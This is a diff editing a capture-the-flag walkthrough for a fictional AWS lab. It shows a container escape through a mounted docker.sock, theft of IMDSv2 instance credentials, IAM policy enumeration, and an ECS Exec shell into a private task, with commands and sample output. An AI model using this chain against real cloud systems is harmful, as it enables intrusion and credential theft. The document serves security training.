@@ -1,10 +1,5 @@
 # Code Judge Escape - Walkthrough
 
-> **Security Note**: Use placeholders for all AWS Account IDs, Access Keys, and Secret Keys.
-> - Account ID: `123456789012`
-> - Access Key: `AKIAIOSFODNN7EXAMPLE` or `ASIAXXXXXXXXXXX`
-> - Secret Key: `xxxxxxxx` or mask actual values
-
 The scenario depicts a fictional company. All AWS Account IDs, IPs, and credentials shown in this document are placeholders (`123456789012`, `203.0.113.42`, `AKIAIOSFODNN7EXAMPLE`, etc.). Substitute your own values.
 
 ## Attack Path
@@ -28,10 +23,10 @@ flowchart TB
 1. Port scan the target; only `8080/tcp` (VulnBoard) is exposed.
 2. Submit code, watch the `Set-Cookie: result_cache=...` header, identify base64-encoded Python pickle bytes.
 3. Craft a pickle gadget; recover an interactive shell inside the VulnBoard container.
-4. Find `/var/run/docker.sock` bind-mounted into the container.
-5. Use the socket to spawn an Alpine container on the **host network** so it can reach IMDSv2 with `hop_limit = 1`.
-6. PUT a token to IMDSv2, GET temporary IAM credentials for the EC2 instance role.
-7. Enumerate ECS; the role has `ecs:ExecuteCommand` left over from a retired platform tool.
+4. Use the bind-mounted `/var/run/docker.sock` to spawn an Alpine container on the **host network** so it can reach IMDSv2 with `hop_limit = 1`, then PUT a token and GET temporary IAM credentials for the EC2 instance role.
+5. Configure the AWS CLI with the stolen credentials.
+6. Enumerate the role; it has `ecs:ExecuteCommand` left over from a retired platform tool.
+7. Enumerate ECS clusters / tasks and confirm `ExecuteCommandAgent` is running.
 8. `aws ecs execute-command` into the private `flag-vault` task and read `/app/data/flag.txt`.
 
 ---
@@ -139,52 +134,31 @@ cat /etc/os-release | head -2
 
 Yes - that is the Flask container, not the EC2 host.
 
-## Step 4: Discover the Docker Socket
+## Step 4: Spawn a Host-Network Container via docker.sock to Reach IMDS
 
-VulnBoard has to grade submissions somehow. Inspect what the container can talk to:
+A quick check inside the VulnBoard container shows the host Docker daemon
+is reachable through a bind-mounted socket and the `docker` CLI is
+already on `$PATH`:
 
 ```bash
 ls -la /var/run/docker.sock
 # srw-rw---- 1 root 999 0 May 18 12:34 /var/run/docker.sock
-```
 
-The socket is bind-mounted into the container. As an extra in-product hint
-the `docker-compose.yml` is also available read-only:
-
-```bash
-cat /srv/docker-compose.yml
-```
-
-```yaml
-services:
-  vulnboard:
-    image: vulnboard:latest
-    ...
-    volumes:
-      - /var/run/docker.sock:/var/run/docker.sock
-      - /opt/vulnboard/docker-compose.yml:/srv/docker-compose.yml:ro
-```
-
-The container ships with the `docker` CLI (the runner uses it to launch
-grading sandboxes), so no additional download is needed:
-
-```bash
 docker version
 # Server: Docker Engine - Community
 #  Version:    26.x
 ```
 
-## Step 5: Reach IMDS Despite hop_limit = 1
-
-The EC2 host has IMDSv2 enforced with `http_put_response_hop_limit = 1`. A
-default bridge-network container therefore *cannot* reach IMDS - the
+The EC2 host has IMDSv2 enforced with `http_put_response_hop_limit = 1`.
+A default bridge-network container therefore *cannot* reach IMDS - the
 response TTL is decremented at the Docker bridge and dropped before it
 reaches the container (see Datadog Security Labs' write-up on IMDS hop
 limits).
 
 But you have the host Docker daemon. Spawn a one-shot container with
-`--network host` - that container shares the host's network namespace, so
-`hop_limit = 1` is satisfied:
+`--network host` - that container shares the host's network namespace,
+so `hop_limit = 1` is satisfied. **No host root shell, no `-v /:/mnt`,
+no `chroot` - just one ephemeral container with the host network**:
 
 ```bash
 docker run --rm --network host alpine:3.19 sh -c '
@@ -216,7 +190,7 @@ Trail of Bits and Aqua AVD-KSV-0006 are the canonical references for why
 not need to break the sandbox, change capabilities, or use any kernel
 exploit; mounting the socket alone is enough.
 
-## Step 6: Configure the AWS CLI
+## Step 5: Configure the AWS CLI
 
 Back on your attacking box:
 
@@ -237,27 +211,101 @@ aws sts get-caller-identity
 }
 ```
 
-## Step 7: Enumerate the Role's Permissions
+## Step 6: Enumerate the Role's Permissions
 
 Use the role name from the assumed-role ARN:
 
 ```bash
 ROLE_NAME=gnawlab-codejudge-app-role-xxxxxxxx
-aws iam list-role-policies        --role-name "$ROLE_NAME"
-aws iam list-attached-role-policies --role-name "$ROLE_NAME"
-aws iam get-role-policy           --role-name "$ROLE_NAME" \
-                                  --policy-name "$(aws iam list-role-policies --role-name "$ROLE_NAME" --query 'PolicyNames[0]' --output text)"
+
+aws iam list-role-policies --role-name "$ROLE_NAME"
 ```
 
-The inline policy contains `ec2:Describe*`, the full `ecs:List*/Describe*` set,
-`ecs:ExecuteCommand`, and `ssmmessages:*`. That last pair - `ecs:ExecuteCommand`
-plus the SSM Messages channel actions - is what makes ECS Exec sessions work.
+```json
+{
+    "PolicyNames": [
+        "gnawlab-codejudge-app-policy-xxxxxxxx"
+    ]
+}
+```
+
+```bash
+aws iam list-attached-role-policies --role-name "$ROLE_NAME"
+```
+
+```json
+{
+    "AttachedPolicies": []
+}
+```
+
+No managed policies attached. The entire surface is in the one inline policy:
+
+```bash
+aws iam get-role-policy --role-name "$ROLE_NAME" \
+    --policy-name gnawlab-codejudge-app-policy-xxxxxxxx
+```
+
+```json
+{
+    "RoleName": "gnawlab-codejudge-app-role-xxxxxxxx",
+    "PolicyName": "gnawlab-codejudge-app-policy-xxxxxxxx",
+    "PolicyDocument": {
+        "Version": "2012-10-17",
+        "Statement": [
+            {
+                "Sid": "EC2Enumeration",
+                "Effect": "Allow",
+                "Action": ["ec2:DescribeInstances", "ec2:DescribeTags"],
+                "Resource": "*"
+            },
+            {
+                "Sid": "ECSEnumeration",
+                "Effect": "Allow",
+                "Action": [
+                    "ecs:ListClusters", "ecs:DescribeClusters",
+                    "ecs:ListServices", "ecs:DescribeServices",
+                    "ecs:ListTasks",    "ecs:DescribeTasks",
+                    "ecs:ListTaskDefinitions", "ecs:DescribeTaskDefinition",
+                    "ecs:ListContainerInstances"
+                ],
+                "Resource": "*"
+            },
+            {
+                "Sid": "ECSExecCommand",
+                "Effect": "Allow",
+                "Action": ["ecs:ExecuteCommand"],
+                "Resource": [
+                    "arn:aws:ecs:us-east-1:123456789012:cluster/gnawlab-codejudge-cluster-xxxxxxxx",
+                    "arn:aws:ecs:us-east-1:123456789012:task/gnawlab-codejudge-cluster-xxxxxxxx/*"
+                ]
+            },
+            {
+                "Sid": "SSMMessagesForExec",
+                "Effect": "Allow",
+                "Action": [
+                    "ssmmessages:CreateControlChannel",
+                    "ssmmessages:CreateDataChannel",
+                    "ssmmessages:OpenControlChannel",
+                    "ssmmessages:OpenDataChannel"
+                ],
+                "Resource": "*"
+            }
+        ]
+    }
+}
+```
+
+The decisive pair is `ecs:ExecuteCommand` + `ssmmessages:*` - that combination
+is what makes ECS Exec sessions work. The cluster ARN limit is the only
+scoping; everything else is `*`. The wildcard `ecs:Describe*` set is what
+lets us enumerate task definitions in the next step.
 
 This permission set looks excessive for a code-grading host. It is: in the
 scenario story the platform team granted it during a 2023 self-service
 deploy push that has since been retired, and the role was never trimmed.
 
-## Step 8: Enumerate ECS
+## Step 7: Enumerate ECS
 
 ```bash
 aws ecs list-clusters
@@ -285,7 +333,7 @@ aws ecs describe-tasks --cluster "$CLUSTER" --tasks "$TASK" \
 
 `ExecuteCommandAgent` confirms ECS Exec is enabled on this task.
 
-## Step 9: Drop a Shell into flag-vault via ECS Exec
+## Step 8: Drop a Shell into flag-vault via ECS Exec
 
 ```bash
 aws ecs execute-command \
